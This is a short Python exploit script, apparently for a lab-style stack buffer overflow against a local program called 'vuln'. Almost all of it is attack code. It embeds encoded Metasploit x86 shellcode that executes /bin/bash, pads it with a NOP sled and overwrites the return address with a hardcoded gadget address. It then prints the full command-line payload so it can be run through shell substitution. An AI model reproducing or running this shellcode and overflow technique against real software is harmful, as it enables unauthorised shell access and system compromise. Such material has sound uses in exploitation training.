import os

#
#
#   Usage: $(python exploit.py)
#
#


# linux/x86/exec - 72 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/bash
buf =  ""
buf += "\xb8\x22\x9f\xea\xe5\xdb\xca\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x0c\x31\x42\x13\x03\x42\x13\x83\xc2\x26\x7d"
buf += "\x1f\x8f\x2d\xd9\x79\x02\x57\xb1\x54\xc0\x1e\xa6\xcf"
buf += "\x29\x53\x41\x10\x5e\xbc\xf3\x79\xf0\x4b\x10\x2b\xe4"
buf += "\x41\xd7\xcc\xf4\x7a\xb5\xa5\x9a\xab\x5b\x57\x10\xdb"
buf += "\x9b\xc0\x85\x92\x7d\x23\xa9"

nop = "\x90"*(100-len(buf))
ret = "\x76\x87\x04\x08" #pop ebp and return
payload ="./vuln HELP " +  nop + buf + ret

print(payload)
